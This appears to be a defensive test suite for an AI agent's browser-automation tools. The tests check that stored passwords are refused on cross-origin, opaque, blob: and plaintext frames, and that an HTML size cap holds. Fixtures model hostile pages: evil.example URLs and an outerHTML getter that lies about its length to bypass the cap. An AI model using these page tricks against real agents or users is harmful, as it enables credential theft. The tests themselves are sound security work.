			args: { index: DATE_INDEX, secret: 'bank_password' },
			code: 'element-not-interactable',
		},
		{
			name: 'an unpinned secret (stricter than browser_type, deliberately)',
			args: { index: PASSWORD_INDEX, secret: 'anywhere' },
			code: 'navigation-blocked',
		},
		{
			name: 'a scaled visual viewport (SEC-24)',
			wire: { scale: 2 },
			args: { index: PASSWORD_INDEX, secret: 'bank_password' },
			code: 'browser-unavailable',
		},
		{
			name: 'a frame whose OWN url is cross-origin to the top document (SEC-07)',
			wire: { topUrl: 'https://bank.example.com/login', frameUrl: 'https://not-the-bank.example/collect' },
			args: { index: PASSWORD_INDEX, secret: 'bank_password' },
			code: 'navigation-blocked',
		},
		{
			name: 'a page that navigated between the state read and the fill',
			wire: { topUrl: 'https://evil.example/', frameUrl: 'https://evil.example/inner' },
			args: { index: PASSWORD_INDEX, secret: 'bank_password' },
			code: 'navigation-blocked',
		},
		{
			name: 'an unknown secret name',
			args: { index: PASSWORD_INDEX, secret: 'no_such_secret' },
			code: 'invalid-arguments',
		},
	];
	for (const item of cases) {
		const f = await secretHarness(item.wire);
		try {
			const error = await assertRejects(
				() =>
					tools.browserFillSecret(
						{ state_token: f.token, ...item.args } as { index: number; secret: string; state_token: string },
						f.ctx,
					),
				ToolError,
				undefined,
				item.name,
			);
			assertEquals(error.code, item.code, `${item.name}: ${error.message}`);
			assertEquals(f.dispatched.length, 0, `${item.name}: a refusal must dispatch nothing`);
			assertEquals(f.record.audit.read({ principal: 'test' }).entries.length, 0, `${item.name}: no audit entry`);
			// Not a value in the refusal either: an error string reaches the transcript and the logs.
			assert(!error.message.includes(BANK_SECRET), `${item.name} leaked the value: ${error.message}`);
			assert(!error.message.includes('P4ssw0rd'), `${item.name} leaked the field's own value: ${error.message}`);
		} finally {
			f.restore();
			await f.registry.shutdown();
		}
	}
});

Deno.test('B2.8: the frame URL is read AFTER the element resolves and immediately BEFORE the dispatch', async () => {
	// The ordering is the whole content of SECURITY-AUTH §7.1's rule: the failure mode is a page that
	// moved between the read and the type, so a read taken earlier proves nothing about where the
	// value landed. Asserted on the call order rather than on a comment.
	const f = await secretHarness();
	try {
		await tools.browserFillSecret({ index: PASSWORD_INDEX, secret: 'bank_password', state_token: f.token }, f.ctx);
		assertEquals(
			f.wired.calls,
			['Page.getLayoutMetrics', 'Page.getFrameTree'],
			'the scale guard runs first so the URL read is the last await before the dispatch',
		);
	} finally {
		f.restore();
		await f.registry.shutdown();
	}
});

/**
 * **S3-R, row 3g / C-16 — the confinement, observed on the handler the widening nearly reached.**
 *
 * `browser_fill_secret` passes `node.frameId ?? undefined`, and in this capture the password input's
 * node carries the **root** frame id: `frames[0].frameId === FORM_FRAME === node.frameId`. So with
 * `isTop` widened, this element's context is `isTop: true` — and had the `liveFrameIdentity`
 * short-circuit been keyed on `isTop` rather than on `named`, every top-document secret fill would
 * have skipped the live-tree search and this refusal would have vanished as a side effect of fixing
 * an unrelated parameter (SEC-FH-15).
 *
 * The caller asserted an id, so the id is checked. Two things are asserted about the *ordering*: the
 * credential is never resolved against a URL, and nothing is dispatched — so no frame URL is put to
 * any use before the refusal. The tree read is what detects the miss and is the last call made.
 */
Deno.test('S3-R: browser_fill_secret still REFUSES when the live tree no longer holds the element’s frame (3g, C-16)', async () => {
	const f = await secretHarness({ dropFrame: true });
	// Did the credential ever get bound to a URL? `substitute` is the one place the pin is applied, so
	// a call to it is the observable form of "a frame URL was read for a decision".
	let substitutions = 0;
	const store = f.secrets as unknown as { substitute: (text: string, url: string) => unknown };
	const original = store.substitute.bind(f.secrets);
	store.substitute = (text: string, url: string) => {
		substitutions++;
		return original(text, url);
	};
	try {
		const error = await assertRejects(
			() => tools.browserFillSecret({ index: PASSWORD_INDEX, secret: 'bank_password', state_token: f.token }, f.ctx),
			ToolError,
		);
		assertEquals(error.code, 'invalid-arguments');
		assertStringIncludes(error.message, 'no longer attached');
		assertStringIncludes(error.message, FORM_FRAME);

		// Before any URL was put to use: the pin was never applied and nothing reached the page.
		assertEquals(substitutions, 0, 'the secret was bound to a URL before the frame check refused');
		assertEquals(f.dispatched.length, 0, 'a refusal must dispatch nothing');
		assertEquals(f.record.audit.read({ principal: 'test', all: true }).entries.length, 0);
		// The scale guard, then the one tree read that detected the miss, and nothing after it.
		assertEquals(f.wired.calls, ['Page.getLayoutMetrics', 'Page.getFrameTree']);
		// And no value, no prefix, in the refusal the client receives.
		assert(!error.message.includes(BANK_SECRET), error.message);
		assert(!error.message.includes(BANK_SECRET.slice(0, 6)), error.message);
	} finally {
		store.substitute = original as typeof store.substitute;
		f.restore();
		await f.registry.shutdown();
	}
});

/**
 * **SEC-FH-23 — every frame tree at which the shipped pin let the credential through.**
 *
 * Each row here was measured TYPED against the code as shipped: the `TypeTextEvent` carried the
 * configured value and the ledger recorded the spend — at `"null"` for the opaque shapes, and at
 * `https://evil.example` for the `blob:` one, which is the sharpest of them. The cause was that
 * `SecretStore.#permits` resolved the pin with `isUrlAllowed`, the navigation predicate, which
 * permits `about:blank`, `data:`, `blob:` and plaintext `http:` before it consults any list.
 *
 * Two of the rows carry a second failure that outlived the predicate and is fixed with it: the
 * confinement compared `originOf(frameUrl) !== originOf(topUrl)`, and `originOf` answers the string
 * `"null"` for EVERY opaque origin, so an `about:blank` top and a `data:` child — two different
 * opaque origins, which cannot script each other — compared same-origin. `browser_get_html` had
 * this right; the credential path, which needs it more, did not.
 *
 * What each row asserts is not just the refusal but its cost: nothing dispatched, so nothing was
 * typed, and no ledger row, so nothing recorded a spend at an origin the pin never approved.
 */
Deno.test('SEC-FH-23: the credential is refused at every opaque and plaintext frame tree, and never dispatched', async () => {
	const rows: Array<{ name: string; wire: SecretWire }> = [
		{ name: 'top and frame BOTH about:blank', wire: { topUrl: 'about:blank' } },
		{
			name: 'top about:blank, frame data: — two DIFFERENT opaque origins that compared equal',
			wire: { topUrl: 'about:blank', frameUrl: 'data:text/html,<input name=p>' },
		},
		{ name: 'top and frame BOTH a data: document', wire: { topUrl: 'data:text/html,<input name=p>' } },
		{
			name: "top and frame a blob: from the ATTACKER's origin (the ledger recorded the spend there)",
			wire: { topUrl: 'blob:https://evil.example/9f0c-uuid' },
		},
		{
			name: 'a blob: minted by the PINNED origin — still not a document the pin approved',
			wire: { topUrl: 'blob:https://bank.example.com/9f0c-uuid' },
		},
		{
			name: 'the pinned host over plaintext http (a downgrade)',
			wire: { topUrl: 'http://bank.example.com/login' },
		},
		{ name: 'a new-tab URL', wire: { topUrl: 'chrome://newtab/' } },
		{
			name: 'a legitimate https top with an about:blank child a script wrote into',
			wire: { topUrl: 'https://bank.example.com/login', frameUrl: 'about:blank' },
		},
	];
	for (const row of rows) {
		const f = await secretHarness(row.wire);
		// Did the credential ever get bound to a URL at all? `substitute` is the single place the pin
		// is applied, so counting calls to it separates "refused after binding" from "never bound".
		let bound = 0;
		const store = f.secrets as unknown as { substitute: (text: string, url: string) => { text: string } };
		const originalSubstitute = store.substitute.bind(f.secrets);
		store.substitute = (text: string, url: string) => {
			const out = originalSubstitute(text, url);
			if (out.text === BANK_SECRET) bound++;
			return out;
		};
		try {
			const error = await assertRejects(
				() => tools.browserFillSecret({ index: PASSWORD_INDEX, secret: 'bank_password', state_token: f.token }, f.ctx),
				ToolError,
				undefined,
				row.name,
			);
			assertEquals(error.code, 'navigation-blocked', `${row.name}: ${error.message}`);
			assertEquals(bound, 0, `${row.name}: the credential was bound to a URL the pin does not cover`);
			assertEquals(f.dispatched.length, 0, `${row.name}: the credential reached the page`);
			assertEquals(
				f.record.audit.read({ principal: 'test', all: true }).entries,
				[],
				`${row.name}: the ledger recorded a spend the pin never approved`,
			);
			assert(!error.message.includes(BANK_SECRET), `${row.name} leaked the value: ${error.message}`);
			assert(!error.message.includes(BANK_SECRET.slice(0, 6)), `${row.name} leaked a prefix: ${error.message}`);
		} finally {
			store.substitute = originalSubstitute as typeof store.substitute;
			f.restore();
			await f.registry.shutdown();
		}
	}
});

/**
 * The row the fix is worthless without — SEC-FH-23 is a narrowing, and a narrowing that swallowed
 * the ordinary case would be an outage wearing a control's name.
 *
 * Same handler, same element, same pinned secret: an https top with a same-origin child frame around
 * the password field, which is the shape SEC-07's per-frame read exists for. It fills.
 */
Deno.test('SEC-FH-23: an ordinary https fill on the pinned domain still succeeds, frame and all', async () => {
	const f = await secretHarness({
		topUrl: 'https://bank.example.com/login',
		frameUrl: 'https://bank.example.com/login/inner',
	});
	try {
		const result = await tools.browserFillSecret(
			{ index: PASSWORD_INDEX, secret: 'bank_password', state_token: f.token },
			f.ctx,
		) as { structuredContent: Record<string, unknown> };
		assertEquals(f.dispatched.length, 1, 'the legitimate fill must still reach the page');
		assertEquals((f.dispatched[0] as { text?: string }).text, BANK_SECRET);
		assertEquals(result.structuredContent.origin, 'https://bank.example.com');
		const entries = f.record.audit.read({ principal: 'test', all: true }).entries;
		assertEquals(entries.length, 1);
		assertEquals(entries[0]?.origin, 'https://bank.example.com');
	} finally {
		f.restore();
		await f.registry.shutdown();
	}
});

/**
 * The amplifier, at the tool that carries it: `available_secrets` is an authorization statement.
 *
 * `browser_get_state` runs the pin through `namesFor` to tell the model which server-held credentials
 * are usable on the current page. Sharing `#permits` with the fill path is the property under test —
 * when the predicate was wrong the server did not merely permit the mistake, it proposed it, naming
 * `bank_password` on an attacker-authored `blob:` document. Asserted on the same store the handler
 * uses, at the URLs `browser_get_state` would read.
 */
Deno.test('SEC-FH-23: available_secrets stops advertising a pinned secret at an origin the pin refuses', async () => {
	const f = await secretHarness();
	try {
		for (
			const url of [
				'about:blank',
				'chrome://newtab/',
				'data:text/html,<input name=p>',
				'blob:https://evil.example/9f0c-uuid',
				'blob:https://bank.example.com/9f0c-uuid',
				'http://bank.example.com/login',
			]
		) {
			const advertised = f.secrets.namesFor(url);
			assertEquals(
				advertised.includes('bank_password'),
				false,
				`browser_get_state would still offer bank_password at ${url}: ${JSON.stringify(advertised)}`,
			);
		}
		// And it is still advertised where it belongs, or the model would be told it has nothing.
		assert(f.secrets.namesFor('https://bank.example.com/login').includes('bank_password'));
	} finally {
		f.restore();
		await f.registry.shutdown();
	}
});

Deno.test('B2.8: browser_type REFUSES a <secret> placeholder under a scaled viewport (SEC-24)', async () => {
	const f = await secretHarness({ scale: 1.5 });
	try {
		// The other secret-bearing path. It is the one that would have been forgotten: the guard lives
		// on `browser_fill_secret` by construction and on `browser_type` only because it was put there.
		const error = await assertRejects(
			() => tools.browserType({ index: PASSWORD_INDEX, text: '<secret>local_password</secret>' }, f.ctx),
			ToolError,
		);
		assertEquals(error.code, 'browser-unavailable');
		assertEquals(error.extras.reason, 'viewport-scaled');
		assertEquals(f.dispatched.length, 0);

		// And an ORDINARY browser_type pays nothing for the guard: no metrics read at all.
		f.wired.calls.length = 0;
		await tools.browserType({ index: PASSWORD_INDEX, text: 'ordinary text' }, f.ctx);
		assertEquals(f.wired.calls, [], 'a type with no placeholder must not pay for a check with no content');
	} finally {
		f.restore();
		await f.registry.shutdown();
	}
});

Deno.test('B2.8: a browser_type substitution is audited too, so the ledger has no hole in it', async () => {
	const f = await secretHarness();
	try {
		// D-096: the pin is the element's frame, read from the frame tree — the same URL the fill path reads.
		await tools.browserType(
			{ index: PASSWORD_INDEX, text: '<secret>bank_password</secret>', state_token: f.token },
			f.ctx,
		);
		const entries = f.record.audit.read({ principal: 'test' }).entries;
		assertEquals(entries.length, 1);
		assertEquals(entries[0]?.kind, 'secret-fill');
		assertEquals(entries[0]?.secret, 'bank_password');
		assertEquals(entries[0]?.frame_id, FORM_FRAME, 'the frame the pin was checked against, not an empty id');
		assertEquals(entries[0]?.origin, 'https://bank.example.com');
		assert(!JSON.stringify(entries).includes(BANK_SECRET));
	} finally {
		f.restore();
		await f.registry.shutdown();
	}
});

Deno.test('B2.8: browser_audit returns own entries under mcp:invoke and all of them under admin (SEC-08)', async () => {
	const f = await secretHarness();
	try {
		f.record.audit.append({
			session_id: f.record.id,
			principal: 'someone-else',
			kind: 'evaluate',
			frame_id: 'F',
			origin: 'https://other.example',
		});
		await tools.browserFillSecret({ index: PASSWORD_INDEX, secret: 'bank_password', state_token: f.token }, f.ctx);

		const own = await tools.browserAudit({}, f.ctx) as {
			structuredContent: { entries: Array<{ principal: string }>; scope: string; dropped: number };
		};
		assertEquals(own.structuredContent.scope, 'own');
		assertEquals(own.structuredContent.entries.map((entry) => entry.principal), ['test']);

		const admin = await tools.browserAudit({}, { ...f.ctx, scopes: new Set(['mcp:invoke', 'admin'] as const) }) as {
			structuredContent: { entries: Array<{ principal: string }>; scope: string };
		};
		assertEquals(admin.structuredContent.scope, 'all');
		assertEquals(admin.structuredContent.entries.length, 2);

		// Absent scopes fail closed: every existing ToolContext constructor omits the field.
		const closed = await tools.browserAudit({}, f.ctx) as { structuredContent: { scope: string } };
		assertEquals(closed.structuredContent.scope, 'own');
	} finally {
		f.restore();
		await f.registry.shutdown();
	}
});

// --- browser_get_html: provenance, truncation and the cross-origin gate (S2, S3) ----------------

/** The structured half of a `browser_get_html` success, validated against its own output schema. */
function htmlPayload(result: ToolResult): Record<string, unknown> {
	const payload = (result as { structuredContent: Record<string, unknown> }).structuredContent;
	assertEquals(
		OUTPUT.browser_get_html.parse(payload),
		payload,
		'the payload and its declared output schema disagree',
	);
	return payload;
}

/**
 * **The S2 decision gate, asserted as a list.**
 *
 * `browser_get_html {}` must cost exactly one `Page.getFrameTree` — the read that makes `url` and
 * `frame_id` live rather than remembered — and one `Runtime.evaluate`. No `observe()`, no DOM tree,
 * no touch of the element table (I-FH-6, C-12). The tool's cheapness is a property the request named
 * and it is pinned here as a sequence rather than as a budget.
 */
Deno.test('S2: browser_get_html {} sends exactly [Page.getFrameTree, Runtime.evaluate] and observes nothing', async () => {
	const h = await frameCdpHarness('iframe_crossorigin');
	try {
		const result = await tools.browserGetHtml({}, h.ctx);
		assertEquals(h.methods(), ['Page.getFrameTree', 'Runtime.evaluate']);
		assertEquals(h.observations(), 0, 'the default path rebuilt the element table');
		assertEquals(h.calls[0]?.sessionId, PAGE_SESSION);
		assertEquals(h.calls[1]?.sessionId, PAGE_SESSION);

		const payload = htmlPayload(result);
		assertEquals(payload.frame_id, h.topFrameId);
		assertEquals(payload.url, 'https://example.com/page');
		assertEquals(payload.state_token, h.record.session.cachedBrowserState?.stateToken ?? null);
		assertEquals(payload.length, TOP_DOCUMENT.length);
		assertEquals(payload.returned_length, TOP_DOCUMENT.length);
		assertEquals(payload.truncated, false);
		assertEquals(payload.media_type, 'text/html');
		// Same-origin — in fact the top document itself — so no grant was spent and no row was written.
		assertEquals('audit_id' in payload, false);
		assertEquals(h.record.audit.read({ principal: 'test', all: true }).entries.length, 0);
	} finally {
		await h.registry.shutdown();
	}
});

/**
 * **S3-R, row 3d / C-15 — the `browser_get_html` half.**
 *
 * Architecture §5.2: the top document is reached by an omitted `frame_id` **or** by a `frame_id`
 * equal to the tree root's id. Naming it must therefore cost the same as omitting it — the same two
 * CDP calls, the same answer, no scope, no ledger row — while still being *verified*, which is the
 * difference row 3e turns on.
 */
Deno.test('S3-R: browser_get_html {frame_id: <top id>} is the top document — no scope, no audit row (3d, C-15)', async () => {
	const h = await frameCdpHarness('iframe_crossorigin');
	try {
		// The default grant. If the named root were treated as a child, the origin comparison would run
		// and this principal would be refused for reading its own focused document.
		const result = await tools.browserGetHtml({ frame_id: h.topFrameId }, h.ctx);
		// The same list the omitted-`frame_id` path spends: Gate C never runs, so no `DOM.*` at all.
		assertEquals(h.methods(), ['Page.getFrameTree', 'Runtime.evaluate']);
		assertEquals(h.observations(), 0);

		const payload = htmlPayload(result);
		assertEquals(payload.frame_id, h.topFrameId);
		assertEquals(payload.url, 'https://example.com/page');
		assertEquals(payload.length, TOP_DOCUMENT.length);
		assertEquals(payload.returned_length, TOP_DOCUMENT.length);
		assertEquals((result as { content: Array<{ text: string }> }).content[0]?.text, TOP_DOCUMENT);
		// Same-origin with itself, so no grant was spent and no row was written.
		assertEquals('audit_id' in payload, false);
		assertEquals(h.record.audit.read({ principal: 'test', all: true }).entries.length, 0);
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('S2: the top document’s frame_id and url are LIVE, not the capture’s memory of them', async () => {
	const h = await frameCdpHarness('iframe_crossorigin', {
		tree: () => ({ frame: { id: 'F-TOP-AFTER-NAVIGATION', url: 'https://moved.example.com/after' } }),
	});
	try {
		const payload = htmlPayload(await tools.browserGetHtml({}, h.ctx));
		assert(h.topFrameId !== 'F-TOP-AFTER-NAVIGATION', 'the cached id must differ, or this proves nothing');
		assertEquals(payload.frame_id, 'F-TOP-AFTER-NAVIGATION');
		assertEquals(payload.url, 'https://moved.example.com/after');
	} finally {
		await h.registry.shutdown();
	}
});

/**
 * F-3, which is the defect this slice repairs on the wire: until now `length` reported `HTML_LIMIT`
 * whenever the cap bound the document, so a caller could not tell a 200 000-character page from a
 * 40 MB one — and the number it was given was not the document's.
 */
Deno.test('S2: a truncated read reports the TRUE length, the returned length, and the frozen notice (F-3)', async () => {
	const huge = `${TOP_DOC_SENTINEL}${'z'.repeat(HTML_LIMIT + 4_000)}`;
	const h = await frameCdpHarness('iframe_crossorigin', { topHtml: huge });
	try {
		const result = await tools.browserGetHtml({}, h.ctx);
		const payload = htmlPayload(result);
		assertEquals(payload.length, huge.length, 'the true length must survive truncation');
		assertEquals(payload.returned_length, HTML_LIMIT);
		assertEquals(payload.truncated, true);
		// I-4: the text block is byte for byte the 0.1.0 rendering, the trailing notice included.
		const text = (result as { content: Array<{ text: string }> }).content[0]!.text;
		assertEquals(text.length, HTML_LIMIT + `\n\n[truncated at ${HTML_LIMIT} characters]`.length);
		assertStringIncludes(text, `[truncated at ${HTML_LIMIT} characters]`);
		assertEquals(text.slice(0, HTML_LIMIT), huge.slice(0, HTML_LIMIT));
	} finally {
		await h.registry.shutdown();
	}
});

Deno.test('S2: a named same-process child frame answers with the CHILD’s document and the CHILD’s url', async () => {
	const h = await frameCdpHarness('iframe_same_site_port', {
		tree: (top, child) => ({
			frame: { id: top, url: 'https://example.com/page' },
			childFrames: [{ frame: { id: child, url: 'https://example.com/page/content' } }],
		}),
	});
	try {
		const result = await tools.browserGetHtml({ frame_id: h.childFrameId }, h.ctx);
		const payload = htmlPayload(result);
		assertEquals(payload.frame_id, h.childFrameId);
		assertEquals(payload.url, 'https://example.com/page/content');
		assertEquals(payload.length, CHILD_DOCUMENT.length);
		const text = (result as { content: Array<{ text: string }> }).content[0]!.text;
		assertEquals(text, CHILD_DOCUMENT);
		// The whole point of the parameter: the bytes are the frame's own and never the top document's.
		assert(!JSON.stringify(result).includes(TOP_DOC_SENTINEL), 'the top document reached a frame read');
		assertEquals(h.methods().filter((method) => method === 'Runtime.evaluate'), []);
		// Same origin as the top document, so this needed no extra grant and wrote no row.
		assertEquals('audit_id' in payload, false);
		assertEquals(h.record.audit.read({ principal: 'test', all: true }).entries.length, 0);
	} finally {
		await h.registry.shutdown();
	}
});

/**
 * C-2 and C-8: the permit side of the gate, and the one row it writes.
 *
 * The frame is cross-origin by **port** and same-process — the shape `isOopif` would have called
 * "not out-of-process, therefore safe" — so this is also the positive half of I-FH-2.
 */
Deno.test('S3: a cross-origin frame IS readable with the evaluate scope, and writes exactly one audit row', async () => {
	const h = await frameCdpHarness('iframe_same_site_port', {
		tree: (top, child) => ({
			frame: { id: top, url: 'http://127.0.0.1:38111/iframe_same_site_port.html' },
			childFrames: [{ frame: { id: child, url: 'http://127.0.0.1:38112/frames/frame_depth2.html?token=SECRET' } }],
		}),
	});
	const ctx: ToolContext = { ...h.ctx, scopes: new Set(['mcp:invoke', 'evaluate'] as const) };
	try {
		const payload = htmlPayload(await tools.browserGetHtml({ frame_id: h.childFrameId }, ctx));
		const entries = h.record.audit.read({ principal: 'test', all: true }).entries;
		assertEquals(entries.length, 1);
		const entry = entries[0]!;
		assertEquals(entry.kind, 'read-frame-html');
		assertEquals(entry.frame_id, h.childFrameId);
		// Scheme, host and port — never the path or the query, which is where a one-time code lives.
		assertEquals(entry.origin, 'http://127.0.0.1:38112');
		assertEquals(entry.ok, true);
		assertEquals(entry.result_bytes, new TextEncoder().encode(CHILD_DOCUMENT).length);
		assertEquals(payload.audit_id, entry.audit_id);
		// I-FH-5 / SEC-FH-6: the ledger is not a second copy of the page.
		const serialized = JSON.stringify(entries);
		assert(!serialized.includes('token=SECRET'), 'the frame URL’s query reached the ledger');
		assert(!serialized.includes('BIL51'), 'a document fragment reached the ledger');
		assert(!serialized.includes(TOP_DOC_SENTINEL));
	} finally {
		await h.registry.shutdown();
	}
});

/**
 * **S3-R, row 4c — the two size fields carry two different units, deliberately.**
 *
 * `returned_length` is **characters** of the capped HTML, because the rest of this tool's contract
 * (`HTML_LIMIT`, `length`, the truncation notice) is stated in characters and the field exists to
 * spare a caller from recomputing `min(length, HTML_LIMIT)`. `result_bytes` is **UTF-8 bytes**,
 * because it shares a ledger column with the `evaluate` rows, which have measured
 * `new TextEncoder().encode(...).length` since B2.8 — one column meaning characters in some rows and
 * bytes in others would be unreadable.
 *
 * The fixture is multi-byte **on purpose**: an all-ASCII document passes under either reading, so an
 * ASCII test cannot catch the two being given the same unit. The S3 row above uses an ASCII child
 * document and is exactly that weaker statement; this is the one that fails if the units merge.
 */
Deno.test('S3-R: result_bytes is UTF-8 BYTES and returned_length is CHARACTERS, on a multi-byte document (4c)', async () => {
	const crossOrigin = {
		tree: (top: string, child: string) => ({
			frame: { id: top, url: 'http://127.0.0.1:38111/iframe_same_site_port.html' },
			childFrames: [{ frame: { id: child, url: 'http://127.0.0.1:38112/frames/frame_depth2.html' } }],
		}),
	};
	const scoped = (ctx: ToolContext): ToolContext => ({ ...ctx, scopes: new Set(['mcp:invoke', 'evaluate'] as const) });
	const bytesOf = (text: string) => new TextEncoder().encode(text).length;

	// --- the untruncated case: the two fields must simply disagree ---------------------------------
	const document = '<html><body><p>日本語の見出し — café naïve — Ω≈ç√</p></body></html>';
	const h = await frameCdpHarness('iframe_same_site_port', { ...crossOrigin, childHtml: document });
	try {
		const payload = htmlPayload(await tools.browserGetHtml({ frame_id: h.childFrameId }, scoped(h.ctx)));
		const entry = h.record.audit.read({ principal: 'test', all: true }).entries[0]!;
		assertEquals(payload.returned_length, document.length, 'returned_length is characters');
		assertEquals(entry.result_bytes, bytesOf(document), 'result_bytes is UTF-8 bytes');
		// The whole point of the fixture. If this ever holds, the two fields have been given one unit.
		assert(
			entry.result_bytes !== payload.returned_length,
			`the fixture stopped being multi-byte: ${entry.result_bytes} === ${payload.returned_length}`,
		);
	} finally {
		await h.registry.shutdown();
	}

	// --- the truncated case: the notice is server boilerplate and is counted in NEITHER -------------
	const huge = `<html><body>${'見'.repeat(HTML_LIMIT)}</body></html>`;
	const capped = huge.slice(0, HTML_LIMIT);
	const notice = `\n\n[truncated at ${HTML_LIMIT} characters]`;
	const t = await frameCdpHarness('iframe_same_site_port', { ...crossOrigin, childHtml: huge });
	try {
		const result = await tools.browserGetHtml({ frame_id: t.childFrameId }, scoped(t.ctx));
		const payload = htmlPayload(result);
		const entry = t.record.audit.read({ principal: 'test', all: true }).entries[0]!;
		assertEquals(payload.truncated, true);
		assertEquals(payload.length, huge.length, 'the TRUE length survives truncation (F-3)');
		assertEquals(payload.returned_length, HTML_LIMIT, 'characters before the notice');
		assertEquals(entry.result_bytes, bytesOf(capped), 'UTF-8 bytes of the capped HTML');
		// Stated as the difference rather than as a second equality, so the assertion names the thing
		// it excludes: counting the notice would make the ledger overstate what left the page.
		assertEquals(
			bytesOf(capped + notice) - (entry.result_bytes ?? 0),
			bytesOf(notice),
			'the truncation notice was counted into result_bytes',
		);
		// And the text block still carries the notice, unchanged (I-4).
		assertStringIncludes((result as { content: Array<{ text: string }> }).content[0]!.text, notice);
	} finally {
		await t.registry.shutdown();
	}
});

/**
 * **SEC-FH-24 — the page does not get to say how much it sent.**
 *
 * D-057 moved the 200 000-character cap out of the server and into the page. That is a real
 * bandwidth win and it was mistaken for a control. The in-page extraction reads exactly two members
 * of whatever `documentElement.outerHTML` returns — `h.length` and `h.slice(0, limit)` — and
 * `outerHTML` is an ordinary configurable accessor, so a getter returning
 * `{ get length() { return 200001 }, slice() { return <as much as it likes> } }` satisfies the
 * extraction, satisfies `typeof html === 'string'` on the wire (its `slice` really does return a
 * string) and chooses the payload. Measured through the shipped handler in real Chromium:
 * **20 000 034 characters delivered in 564 ms** on `browser_get_html {}` — the default path, no
 * `frame_id`, no scope — reported back as `length: 200001, truncated: true`.
 *
 * Every row below drives that getter's shape through the fake's own reproduction of the in-page
 * arithmetic, so the triple on the wire is *derived from the hostile object* rather than hand-written
 * here, and asserts the two properties the repair owes: the payload is bounded **by the server**, and
 * every number in the response is the server's measurement of the string the server is holding. All
 * three extraction shapes, because the bypass was measured on all three.
 *
 * Against the pre-fix tree each row fails on its first assertion, with `returned_length` reporting
 * the whole payload.
 */
Deno.test('SEC-FH-24: a hostile outerHTML getter chooses neither the payload nor the numbers, on all three extraction shapes', async () => {
	const PAYLOAD_CHARS = HTML_LIMIT * 5;
	const NOTICE = `\n\n[truncated at ${HTML_LIMIT} characters]`;
	/**
	 * The getter's return value, exactly as the real-Chromium probe built it: `length` reports one
	 * character over the cap — enough to take the extraction's `slice` branch, and enough to make a
	 * server that believes the number answer `truncated: true` — and `slice` ignores its arguments.
	 */
	const liar = (): PageOuterHtml => {
		const payload = 'H'.repeat(PAYLOAD_CHARS);
		return { length: HTML_LIMIT + 1, slice: () => payload };
	};
	// Same-origin throughout, deliberately: the measured exploit needs no scope, no `frame_id` and no
	// cross-origin frame, and a row that had to be granted `evaluate` first would be describing a
	// smaller defect than the one that shipped.
	const sameOrigin = (top: string, child: string) => ({
		frame: { id: top, url: 'https://example.com/page' },
		childFrames: [{ frame: { id: child, url: 'https://example.com/page/child' } }],
	});
	const shapes: ReadonlyArray<{
		readonly name: string;
		readonly extraction: string;
		open(): Promise<FrameCdpHarness>;
		read(h: FrameCdpHarness): Promise<ToolResult>;
	}> = [
		{
			name: 'top document — the default path, no frame_id and no scope check at all',
			extraction: 'Runtime.evaluate',
			open: () => frameCdpHarness('iframe_crossorigin', { tree: sameOrigin, topHtml: liar() }),
			read: (h) => tools.browserGetHtml({}, h.ctx),
		},
		{
			name: 'same-process child — Runtime.callFunctionOn on the Document handle',
			extraction: 'Runtime.callFunctionOn',
			open: () => frameCdpHarness('iframe_same_site_port', { tree: sameOrigin, childHtml: liar() }),
			read: (h) => tools.browserGetHtml({ frame_id: h.childFrameId }, h.ctx),
		},
		{
			name: 'out-of-process frame — Runtime.evaluate against its own target',
			extraction: 'Runtime.evaluate',
			open: () => frameCdpHarness('iframe_crossorigin', { tree: sameOrigin, childHtml: liar() }),
			read: (h) => tools.browserGetHtml({ frame_id: h.childFrameId }, h.ctx),
		},
	];
	for (const shape of shapes) {
		const h = await shape.open();
		try {
			const result = await shape.read(h);
			const payload = htmlPayload(result);
			const text = (result as { content: Array<{ text: string }> }).content[0]!.text;
			// (1) The payload is BOUNDED, and bounded by this process rather than by the page's promise.
			assertEquals(payload.returned_length, HTML_LIMIT, `${shape.name}: returned_length escaped the cap`);
			assertEquals(text.length, HTML_LIMIT + NOTICE.length, `${shape.name}: the text block escaped the cap`);
			assertStringIncludes(text, NOTICE);
			// (2) The NUMBERS are the server's own. The page claimed 200 001 characters; `length` is
			// what actually arrived, and it is never allowed to understate the payload it describes.
			assertEquals(payload.truncated, true, shape.name);
			assertEquals(payload.length, PAYLOAD_CHARS, `${shape.name}: length must be measured, not believed`);
			assert(
				(payload.length as number) >= (payload.returned_length as number),
				`${shape.name}: length ${payload.length} understates returned_length ${payload.returned_length}`,
			);
			// (3) And the row really did exercise the shape it names — otherwise three rows could pass
			// while one extraction path stayed unmeasured, which is how the bypass shipped on all three.
			assertEquals(
				h.methods().filter((method) => method === shape.extraction).length,
				1,
				`${shape.name}: expected exactly one ${shape.extraction}, sent ${h.methods().join(', ')}`,
			);
		} finally {
			await h.registry.shutdown();
		}
	}
});

/**
 * SEC-FH-24's honest half, stated as its own row: the repair must not cost F-3.
 *
 * `length` is still the document's TRUE character count whenever the page reports one truthfully —
 * the server floors the page's number with its own measurement and never replaces it, because an
 * honest page's `html` is a slice of the document it measured and is therefore never longer. A fix
 * that simply reported `min(length, HTML_LIMIT)`, or that recomputed `length` from the bytes it
 * received, would pass the hostile row above and re-introduce the defect F-3 repaired.
 */
Deno.test('SEC-FH-24: an honest page keeps its TRUE length — the clamp floors the number, it does not replace it (F-3)', async () => {
	const huge = `${TOP_DOC_SENTINEL}${'z'.repeat(HTML_LIMIT * 3)}`;
	const h = await frameCdpHarness('iframe_crossorigin', { topHtml: huge });
	try {
		const payload = htmlPayload(await tools.browserGetHtml({}, h.ctx));
		assertEquals(payload.length, huge.length, 'the honest true length must survive the server-side clamp');
		assertEquals(payload.returned_length, HTML_LIMIT);
		assertEquals(payload.truncated, true);
		assert((payload.length as number) > HTML_LIMIT, 'the fixture stopped exceeding the cap');
	} finally {
		await h.registry.shutdown();
	}
});
